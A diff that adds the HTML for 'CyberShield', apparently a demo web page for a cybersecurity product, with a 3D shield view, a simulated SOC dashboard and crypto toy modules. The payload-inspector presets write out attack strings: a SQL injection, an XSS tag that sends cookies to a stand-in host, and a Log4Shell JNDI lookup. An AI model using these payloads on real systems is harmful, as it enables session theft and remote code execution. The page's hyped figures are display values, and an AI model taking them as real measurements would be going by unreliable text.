@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en" class="dark scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CyberShield // 3D Zero-Trust Security Architecture</title>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Space Grotesk', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          },
+          colors: {
+            cyber: {
+              bg: '#050811',
+              panel: 'rgba(13, 20, 36, 0.75)',
+              cyan: '#00f0ff',
+              emerald: '#00ff9d',
+              crimson: '#ff2a5f',
+              amber: '#ffb800',
+              violet: '#8b5cf6'
+            }
+          }
+        }
+      }
+    }
+  </script>
+
+  <!-- Three.js r128 -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+
+  <!-- Custom Stylesheet -->
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body class="bg-cyber-bg text-slate-100 font-sans antialiased selection:bg-cyber-cyan selection:text-black overflow-x-hidden relative">
+
+  <!-- ========================================================= -->
+  <!-- RESTORED BACKGROUND EFFECTS LAYER (GRID, ORBS, SCANLINES) -->
+  <!-- ========================================================= -->
+  <div class="fixed inset-0 pointer-events-none z-0 overflow-hidden">
+    <!-- Ambient Glowing Nebula Orbs -->
+    <div id="ambient-orb-1" class="ambient-orb orb-cyan"></div>
+    <div id="ambient-orb-2" class="ambient-orb orb-violet"></div>
+    <div id="ambient-orb-3" class="ambient-orb orb-emerald"></div>
+
+    <!-- 3D Perspective Floor & Ceiling Cyber Grid -->
+    <div class="cyber-grid-perspective"></div>
+
+    <!-- Subtle Hex/Matrix Grid Overlay -->
+    <div class="cyber-grid-flat"></div>
+
+    <!-- CRT Scanline & Vignette Overlay -->
+    <div class="crt-scanlines"></div>
+    <div class="vignette-overlay"></div>
+  </div>
+
+  <!-- Top Navigation Bar -->
+  <header class="sticky top-0 z-50 backdrop-blur-xl bg-[#050811]/80 border-b border-cyan-500/20">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <div class="relative flex h-3 w-3">
+          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyber-cyan opacity-75"></span>
+          <span class="relative inline-flex rounded-full h-3 w-3 bg-cyber-cyan"></span>
+        </div>
+        <span class="font-mono font-bold tracking-wider text-lg text-white">
+          CYBER<span class="text-cyber-cyan">SHIELD</span> // <span class="text-xs text-slate-400 font-normal">v4.9.2</span>
+        </span>
+      </div>
+
+      <nav class="hidden md:flex items-center gap-8 text-sm font-mono text-slate-300">
+        <a href="#core" class="hover:text-cyber-cyan transition">01.3D_CORE</a>
+        <a href="#soc" class="hover:text-cyber-cyan transition">02.LIVE_SOC</a>
+        <a href="#architecture" class="hover:text-cyber-cyan transition">03.ZERO_TRUST</a>
+        <a href="#crypto" class="hover:text-cyber-cyan transition">04.CRYPTO_LAB</a>
+      </nav>
+
+      <div class="flex items-center gap-3">
+        <span id="global-status-badge" class="px-3 py-1 rounded-full text-xs font-mono bg-emerald-500/10 text-cyber-emerald border border-emerald-500/30 flex items-center gap-2 shadow-[0_0_15px_rgba(0,255,157,0.2)]">
+          <span class="w-2 h-2 rounded-full bg-cyber-emerald animate-pulse"></span>
+          DEFCON 5 // NOMINAL
+        </span>
+      </div>
+    </div>
+  </header>
+
+  <main class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-20">
+
+    <!-- SECTION 1: 3D FORCEFIELD HERO -->
+    <section id="core" class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center min-h-[640px]">
+      <!-- Left Column: Telemetry & Controls -->
+      <div class="lg:col-span-5 space-y-6">
+        <div class="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-cyan-500/10 border border-cyan-500/30 text-cyber-cyan font-mono text-xs shadow-[0_0_20px_rgba(0,240,255,0.15)]">
+          <span>QUANTUM-RESISTANT MESH ACTIVE</span>
+        </div>
+
+        <h1 class="text-4xl sm:text-5xl font-bold tracking-tight leading-tight">
+          Autonomous 3D <span class="text-transparent bg-clip-text bg-gradient-to-r from-cyber-cyan via-emerald-400 to-violet-500">Cyber Defense</span> Forcefield
+        </h1>
+
+        <p class="text-slate-400 text-base leading-relaxed">
+          Real-time neural packet inspection, eBPF kernel-level DDoS scrubbing, and post-quantum lattice cryptography visualized through an interactive Three.js orbital shield core.
+        </p>
+
+        <!-- Shield Mode Switcher -->
+        <div class="space-y-2">
+          <label class="text-xs font-mono uppercase tracking-wider text-slate-400">Select Shield Operational Mode:</label>
+          <div class="grid grid-cols-2 gap-2.5">
+            <button data-mode="nominal" class="shield-mode-btn active-mode px-4 py-2.5 rounded-lg font-mono text-xs border border-cyan-500/40 bg-cyan-500/10 text-cyber-cyan hover:bg-cyan-500/20 transition flex items-center justify-between">
+              <span>AEGIS NOMINAL</span>
+              <span class="w-2 h-2 rounded-full bg-cyber-cyan shadow-[0_0_8px_#00f0ff]"></span>
+            </button>
+            <button data-mode="ddos" class="shield-mode-btn px-4 py-2.5 rounded-lg font-mono text-xs border border-slate-700 bg-slate-900/60 text-slate-300 hover:border-rose-500/50 hover:text-cyber-crimson transition flex items-center justify-between">
+              <span>SIMULATE DDoS</span>
+              <span class="w-2 h-2 rounded-full bg-cyber-crimson shadow-[0_0_8px_#ff2a5f]"></span>
+            </button>
+            <button data-mode="quantum" class="shield-mode-btn px-4 py-2.5 rounded-lg font-mono text-xs border border-slate-700 bg-slate-900/60 text-slate-300 hover:border-violet-500/50 hover:text-violet-400 transition flex items-center justify-between">
+              <span>QUANTUM LOCK</span>
+              <span class="w-2 h-2 rounded-full bg-violet-400 shadow-[0_0_8px_#8b5cf6]"></span>
+            </button>
+            <button data-mode="scan" class="shield-mode-btn px-4 py-2.5 rounded-lg font-mono text-xs border border-slate-700 bg-slate-900/60 text-slate-300 hover:border-emerald-500/50 hover:text-cyber-emerald transition flex items-center justify-between">
+              <span>SCAN NODES</span>
+              <span class="w-2 h-2 rounded-full bg-cyber-emerald shadow-[0_0_8px_#00ff9d]"></span>
+            </button>
+          </div>
+        </div>
+
+        <!-- EMP Action & Quick Metrics -->
+        <div class="flex flex-wrap items-center gap-4 pt-2">
+          <button id="emp-btn" class="px-5 py-3 rounded-lg font-mono text-xs font-bold tracking-wider uppercase bg-gradient-to-r from-cyber-cyan to-emerald-400 text-slate-950 hover:brightness-110 active:scale-95 transition shadow-[0_0_25px_rgba(0,240,255,0.4)]">
+            ⚡ Trigger EMP Shockwave
+          </button>
+          <span class="text-xs font-mono text-slate-400">Drag 3D Core to Rotate • Scroll to Zoom</span>
+        </div>
+      </div>
+
+      <!-- Right Column: Interactive Three.js 3D Viewport -->
+      <div class="lg:col-span-7 relative h-[500px] sm:h-[560px] rounded-2xl glass-panel border border-cyan-500/30 overflow-hidden group">
+        <!-- Radial Backlight Behind 3D Shield -->
+        <div id="core-backlight" class="absolute inset-0 pointer-events-none radial-core-glow transition-all duration-700"></div>
+
+        <!-- Corner HUD Brackets -->
+        <div class="hud-bracket top-3 left-3 border-t-2 border-l-2"></div>
+        <div class="hud-bracket top-3 right-3 border-t-2 border-r-2"></div>
+        <div class="hud-bracket bottom-3 left-3 border-b-2 border-l-2"></div>
+        <div class="hud-bracket bottom-3 right-3 border-b-2 border-r-2"></div>
+
+        <!-- Corner HUD Overlays -->
+        <div class="absolute top-5 left-5 z-10 font-mono text-xs space-y-1 pointer-events-none">
+          <div class="text-slate-400">CORE_ROTATION: <span id="hud-rotation" class="text-cyber-cyan">0.24 rad/s</span></div>
+          <div class="text-slate-400">SHIELD_INTEGRITY: <span id="hud-integrity" class="text-cyber-emerald">99.98%</span></div>
+          <div class="text-slate-400">ACTIVE_NODES: <span class="text-white">320 ORBITAL</span></div>
+        </div>
+
+        <div class="absolute top-5 right-5 z-10 font-mono text-xs text-right pointer-events-none">
+          <div class="text-cyber-cyan animate-pulse">● LIVE WEBGL TELEMETRY</div>
+          <div id="hud-mode-label" class="text-slate-400">STATE: AEGIS_FORCEFIELD</div>
+        </div>
+
+        <div class="absolute bottom-5 left-5 z-10 font-mono text-xs pointer-events-none">
+          <div class="text-slate-400">LATENCY_SCRUB: <span class="text-cyber-emerald">0.38 ms</span></div>
+          <div class="text-slate-400">PACKET_DROP: <span id="hud-drop-rate" class="text-cyber-cyan">14.8k pps</span></div>
+        </div>
+
+        <div class="absolute bottom-5 right-5 z-10 font-mono text-xs text-right pointer-events-none">
+          <div class="text-slate-400">ENCRYPTION: <span class="text-violet-400">ML-KEM-1024</span></div>
+          <div class="text-slate-400">KERNEL FILTER: <span class="text-cyber-cyan">XDP_DROP READY</span></div>
+        </div>
+
+        <!-- Three.js Canvas Mount -->
+        <div id="canvas-container" class="w-full h-full cursor-grab active:cursor-grabbing relative z-0"></div>
+      </div>
+    </section>
+
+    <!-- SECTION 2: LIVE SOC DASHBOARD & DEEP PACKET INSPECTOR -->
+    <section id="soc" class="space-y-6">
+      <div class="flex flex-col sm:flex-row sm:items-end justify-between gap-4 border-b border-slate-800/80 pb-4">
+        <div>
+          <span class="text-xs font-mono text-cyber-cyan uppercase tracking-widest">// 02. TELEMETRY & INSPECTION</span>
+          <h2 class="text-2xl sm:text-3xl font-bold mt-1">Security Operations Center (SOC)</h2>
+        </div>
+        <div class="grid grid-cols-3 gap-4 font-mono text-xs">
+          <div class="glass-panel px-4 py-2.5 rounded-lg border border-cyan-500/20">
+            <div class="text-slate-400">BLOCKED/SEC</div>
+            <div id="metric-blocked" class="text-lg font-bold text-cyber-cyan">14,820</div>
+          </div>
+          <div class="glass-panel px-4 py-2.5 rounded-lg border border-emerald-500/20">
+            <div class="text-slate-400">LATENCY</div>
+            <div id="metric-latency" class="text-lg font-bold text-cyber-emerald">0.42 ms</div>
+          </div>
+          <div class="glass-panel px-4 py-2.5 rounded-lg border border-amber-500/20">
+            <div class="text-slate-400">THREAT LEVEL</div>
+            <div id="metric-threat" class="text-lg font-bold text-amber-400">LOW</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+        <!-- Live Packet Stream -->
+        <div class="lg:col-span-7 glass-panel rounded-xl border border-slate-800 p-5 flex flex-col justify-between h-[430px]">
+          <div class="flex items-center justify-between mb-3">
+            <div class="flex items-center gap-2">
+              <span class="w-2 h-2 rounded-full bg-cyber-emerald animate-ping"></span>
+              <h3 class="font-mono text-sm font-bold tracking-wider">LIVE PACKET MITIGATION STREAM</h3>
+            </div>
+            <button id="toggle-stream-btn" class="px-3 py-1 rounded text-xs font-mono border border-slate-700 hover:border-cyber-cyan text-slate-300 transition">
+              PAUSE FEED
+            </button>
+          </div>
+
+          <div id="packet-log" class="flex-1 overflow-y-auto font-mono text-xs space-y-2 pr-2 custom-scrollbar"></div>
+        </div>
+
+        <!-- Deep Packet & Payload Inspector -->
+        <div class="lg:col-span-5 glass-panel rounded-xl border border-slate-800 p-5 flex flex-col justify-between h-[430px]">
+          <div class="space-y-3">
+            <h3 class="font-mono text-sm font-bold tracking-wider text-cyber-cyan">DEEP PACKET & PAYLOAD INSPECTOR</h3>
+            <p class="text-xs text-slate-400">Test WAF & zero-trust signature heuristics against malicious payloads or select a preset vector:</p>
+
+            <div class="flex flex-wrap gap-1.5">
+              <button data-payload="SELECT * FROM users WHERE id = '1' OR '1'='1' --" class="preset-btn text-[11px] font-mono px-2.5 py-1 rounded bg-slate-800/80 hover:bg-rose-500/20 hover:text-cyber-crimson border border-slate-700 transition">SQLi Vector</button>
+              <button data-payload="<script>fetch('https://c2.dark.io/steal?c='+document.cookie)</script>" class="preset-btn text-[11px] font-mono px-2.5 py-1 rounded bg-slate-800/80 hover:bg-rose-500/20 hover:text-cyber-crimson border border-slate-700 transition">XSS Script</button>
+              <button data-payload="${jndi:ldap://198.51.100.44:1389/ExploitPayload}" class="preset-btn text-[11px] font-mono px-2.5 py-1 rounded bg-slate-800/80 hover:bg-rose-500/20 hover:text-cyber-crimson border border-slate-700 transition">Log4Shell RCE</button>
+              <button data-payload="GET /api/v2/telemetry HTTP/2.0 [mTLS:SPIFFE-Verified]" class="preset-btn text-[11px] font-mono px-2.5 py-1 rounded bg-slate-800/80 hover:bg-emerald-500/20 hover:text-cyber-emerald border border-slate-700 transition">Clean mTLS</button>
+            </div>
+
+            <textarea id="payload-input" rows="4" class="w-full rounded-lg bg-slate-950/90 border border-slate-700 p-3 font-mono text-xs text-slate-200 focus:outline-none focus:border-cyber-cyan" placeholder="Paste HTTP request, SQL query, or shell payload to inspect..."></textarea>
+
+            <button id="inspect-btn" class="w-full py-2.5 rounded-lg bg-cyan-500/20 border border-cyber-cyan text-cyber-cyan font-mono text-xs font-bold hover:bg-cyan-500/30 transition shadow-[0_0_15px_rgba(0,240,255,0.2)]">
+              RUN HEURISTIC SANDBOX SCAN
+            </button>
+          </div>
+
+          <div id="inspect-result" class="p-3 rounded-lg bg-slate-950/80 border border-slate-800 font-mono text-xs text-slate-400">
+            STATUS: Awaiting payload input for deep heuristic analysis...
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 3: 4-LAYER ZERO-TRUST ARCHITECTURE STACK -->
+    <section id="architecture" class="space-y-6">
+      <div class="flex flex-col sm:flex-row sm:items-end justify-between gap-4">
+        <div>
+          <span class="text-xs font-mono text-cyber-cyan uppercase tracking-widest">// 03. DEFENSE-IN-DEPTH</span>
+          <h2 class="text-2xl sm:text-3xl font-bold mt-1">4-Layer Zero-Trust Architecture</h2>
+        </div>
+        <span class="text-xs font-mono text-slate-400">Click any layer to synchronize 3D Forcefield Core</span>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+        <div data-sync-mode="ddos" class="tilt-card cursor-pointer glass-panel p-6 rounded-xl border border-slate-800 hover:border-cyber-cyan transition space-y-3">
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-mono text-cyber-cyan">LAYER 01 // PERIMETER</span>
+            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-500/10 text-cyber-cyan">XDP_DROP</span>
+          </div>
+          <h3 class="text-lg font-bold">Edge eBPF Scrubbing</h3>
+          <p class="text-xs text-slate-400 leading-relaxed">
+            Drops volumetric SYN/UDP floods directly at the NIC driver level using Linux XDP before packets reach the OS network stack.
+          </p>
+        </div>
+
+        <div data-sync-mode="nominal" class="tilt-card cursor-pointer glass-panel p-6 rounded-xl border border-slate-800 hover:border-cyber-emerald transition space-y-3">
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-mono text-cyber-emerald">LAYER 02 // IDENTITY</span>
+            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/10 text-cyber-emerald">SPIFFE</span>
+          </div>
+          <h3 class="text-lg font-bold">Zero-Trust mTLS Mesh</h3>
+          <p class="text-xs text-slate-400 leading-relaxed">
+            Replaces static IP trust with short-lived cryptographic X.509 workload identities rotated every 15 minutes across microservices.
+          </p>
+        </div>
+
+        <div data-sync-mode="scan" class="tilt-card cursor-pointer glass-panel p-6 rounded-xl border border-slate-800 hover:border-amber-400 transition space-y-3">
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-mono text-amber-400">LAYER 03 // HEURISTICS</span>
+            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/10 text-amber-400">GNN_AI</span>
+          </div>
+          <h3 class="text-lg font-bold">AI Behavioral Anomaly</h3>
+          <p class="text-xs text-slate-400 leading-relaxed">
+            Unsupervised graph neural networks baseline east-west API traffic to isolate lateral movement and zero-day exfiltration within 3ms.
+          </p>
+        </div>
+
+        <div data-sync-mode="quantum" class="tilt-card cursor-pointer glass-panel p-6 rounded-xl border border-slate-800 hover:border-violet-400 transition space-y-3">
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-mono text-violet-400">LAYER 04 // CRYPTOGRAPHY</span>
+            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-violet-500/10 text-violet-400">FIPS-203</span>
+          </div>
+          <h3 class="text-lg font-bold">Post-Quantum Vault</h3>
+          <p class="text-xs text-slate-400 leading-relaxed">
+            Hybrid key encapsulation combining X25519 with NIST-standardized ML-KEM-1024 (Kyber) to neutralize harvest-now-decrypt-later attacks.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 4: INTERACTIVE CRYPTOGRAPHIC WORKBENCH (ALL 3 MODULES) -->
+    <section id="crypto" class="space-y-6 pb-16">
+      <div>
+        <span class="text-xs font-mono text-cyber-cyan uppercase tracking-widest">// 04. APPLIED CRYPTOGRAPHY</span>
+        <h2 class="text-2xl sm:text-3xl font-bold mt-1">Interactive Cryptographic Workbench</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Module 1: SHA-256 Live Hash & Avalanche Lab -->
+        <div class="glass-panel rounded-xl border border-slate-800 p-6 space-y-4 flex flex-col justify-between">
+          <div class="space-y-3">
+            <div class="flex items-center justify-between">
+              <h3 class="font-mono text-sm font-bold text-cyber-cyan">01 // SHA-256 AVALANCHE LAB</h3>
+              <button id="mutate-btn" class="text-xs font-mono px-2.5 py-1 rounded bg-cyan-500/10 text-cyber-cyan border border-cyan-500/30 hover:bg-cyan-500/20 transition">
+                Flip 1 Bit
+              </button>
+            </div>
+            <p class="text-xs text-slate-400">Observe how flipping a single character bit radically alters the entire 256-bit digest:</p>
+            <input id="sha-input" type="text" value="CyberShield-ZeroTrust-Block#0042" class="w-full rounded-lg bg-slate-950 border border-slate-700 px-3 py-2 font-mono text-xs text-white focus:outline-none focus:border-cyber-cyan" />
+          </div>
+          <div class="space-y-1 pt-2">
+            <div class="text-[11px] font-mono text-slate-400">256-BIT HEX DIGEST:</div>
+            <div id="sha-output" class="p-3 rounded-lg bg-slate-950 border border-slate-800 font-mono text-xs text-cyber-emerald break-all leading-relaxed"></div>
+          </div>
+        </div>
+
+        <!-- Module 2: AES-256-GCM Authenticated Cipher Simulator -->
+        <div class="glass-panel rounded-xl border border-slate-800 p-6 space-y-4 flex flex-col justify-between">
+          <div class="space-y-3">
+            <div class="flex items-center justify-between">
+              <h3 class="font-mono text-sm font-bold text-cyber-emerald">02 // AES-256-GCM SEAL</h3>
+              <button id="aes-btn" class="text-xs font-mono px-2.5 py-1 rounded bg-emerald-500/10 text-cyber-emerald border border-emerald-500/30 hover:bg-emerald-500/20 transition">
+                Rotate Nonce
+              </button>
+            </div>
+            <p class="text-xs text-slate-400">Simulates authenticated encryption with a 96-bit IV nonce and 128-bit Poly1305/GCM Auth Tag:</p>
+            <input id="aes-input" type="text" value="CONFIDENTIAL: Launch Key 994-Delta" class="w-full rounded-lg bg-slate-950 border border-slate-700 px-3 py-2 font-mono text-xs text-white focus:outline-none focus:border-cyber-emerald" />
+          </div>
+          <div class="space-y-1 pt-2 font-mono text-xs">
+            <div class="text-[11px] text-slate-400">CIPHERTEXT + 128-BIT AUTH TAG:</div>
+            <div id="aes-output" class="p-3 rounded-lg bg-slate-950 border border-slate-800 text-amber-400 break-all leading-relaxed"></div>
+          </div>
+        </div>
+
+        <!-- Module 3: Password Entropy & Quantum Grover Estimator -->
+        <div class="glass-panel rounded-xl border border-slate-800 p-6 space-y-4 flex flex-col justify-between">
+          <div class="space-y-3">
+            <h3 class="font-mono text-sm font-bold text-violet-400">03 // QUANTUM GROVER ESTIMATOR</h3>
+            <p class="text-xs text-slate-400">Evaluates classical Shannon entropy vs. post-quantum Grover's algorithm ($\sqrt{N}$ speedup):</p>
+            <input id="entropy-input" type="text" placeholder="Type passphrase to evaluate..." value="Tr0ub4dor&3#Quantum!" class="w-full rounded-lg bg-slate-950 border border-slate-700 px-3 py-2 font-mono text-xs text-white focus:outline-none focus:border-violet-400" />
+          </div>
+          <div class="grid grid-cols-3 gap-2 font-mono text-xs pt-2">
+            <div class="p-2.5 rounded-lg bg-slate-950 border border-slate-800">
+              <div class="text-slate-400 text-[10px]">CLASSICAL</div>
+              <div id="entropy-bits" class="text-sm font-bold text-white mt-1">0 bits</div>
+            </div>
+            <div class="p-2.5 rounded-lg bg-slate-950 border border-slate-800">
+              <div class="text-slate-400 text-[10px]">QUANTUM</div>
+              <div id="quantum-bits" class="text-sm font-bold text-violet-400 mt-1">0 bits</div>
+            </div>
+            <div class="p-2.5 rounded-lg bg-slate-950 border border-slate-800">
+              <div class="text-slate-400 text-[10px]">VERDICT</div>
+              <div id="entropy-grade" class="text-sm font-bold text-cyber-emerald mt-1">SAFE</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Custom Logic Script -->
+  <script src="script.js"></script>
+</body>
+</html>
